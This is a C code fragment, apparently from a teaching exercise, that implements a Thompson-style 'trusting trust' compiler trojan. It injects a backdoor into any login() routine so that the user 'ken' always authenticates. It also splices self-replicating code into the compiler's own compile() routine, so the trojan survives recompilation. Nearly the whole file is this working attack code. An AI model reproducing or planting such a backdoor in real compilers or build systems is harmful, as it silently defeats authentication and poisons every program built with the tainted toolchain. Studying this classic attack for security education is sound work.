// can put any payload here.
// attack code

/*****************************************************************
 * Step 1:
 */

// match on the start of the login() routine:
static char login_sig[] = "int login(char *user) {";
static char login_attack[] = "if(strcmp(user, \"ken\") == 0) return 1;";

char *match_ptr = strstr(program, login_sig);
char *new_prog = NULL;

if (match_ptr != NULL)
{
    char *start_second_part = match_ptr + strlen(login_sig);

    size_t len_first_part = match_ptr - program;
    size_t len_to_insert = strlen(login_attack);
    size_t len_second_part = strlen(start_second_part);
    size_t new_size = len_first_part + strlen(login_sig) + len_to_insert + len_second_part + 1;

    new_prog = malloc(sizeof(char) * new_size);
    strncpy(new_prog, program, len_first_part);
    new_prog[len_first_part] = '\0'; // for strcat
    strcat(new_prog, login_sig);
    strcat(new_prog, login_attack);
    strcat(new_prog, start_second_part);
}

/*****************************************************************
 * Step 2:
 */

// search for the start of the compile routine:
static char compile_sig[] =
    "static void compile(char *program, char *outname) {\n"
    "    FILE *fp = fopen(\"./temp-out.c\", \"w\");\n"
    "    assert(fp);";

// and inject a placeholder "attack":
// inject this after the assert above after the call to fopen.
// not much of an attack.   this is just a quick placeholder.
// static char compile_attack[] = "printf(\"%s: could have run your attack here!!\\n\", __FUNCTION__);";

match_ptr = strstr(program, compile_sig);
static char compile_attack[50000];
// compile_attack[BUFF_SIZE - 1] = '\0';
// the attack code now is the self-replication code
if (match_ptr != NULL)
{
    /* ... I'm not so sure here ...*/
    // Propagate the ASCII array
    int i;
    int offset = 0;
    offset += snprintf(compile_attack + offset, sizeof(compile_attack) - offset, "char prog[] = {\n");
    for (i = 0; prog[i]; i++)
        offset += snprintf(compile_attack + offset, sizeof(compile_attack) - offset, "\t%d,%c", prog[i], (i + 1) % 8 == 0 ? '\n' : ' ');
    offset += snprintf(compile_attack + offset, sizeof(compile_attack) - offset, "0 };\n");

    // print actual program text
    offset += snprintf(compile_attack + offset, sizeof(compile_attack) - offset, "%s", prog);
    compile_attack[offset] = '\0'; // maybe it helps with the len

    char *start_second_part = match_ptr + strlen(compile_sig);
    size_t len_first_part = match_ptr - program;
    size_t len_to_insert = strlen(compile_attack);
    size_t len_second_part = strlen(start_second_part);
    size_t new_size = len_first_part + strlen(compile_sig) + len_to_insert + len_second_part + 1;

    new_prog = malloc(sizeof(char) * new_size);

    // Concatenate all the part
    strncpy(new_prog, program, len_first_part);
    new_prog[len_first_part] = '\0'; // for strcat
    strcat(new_prog, compile_sig);
    strcat(new_prog, compile_attack);
    strcat(new_prog, start_second_part);
}

program = new_prog;
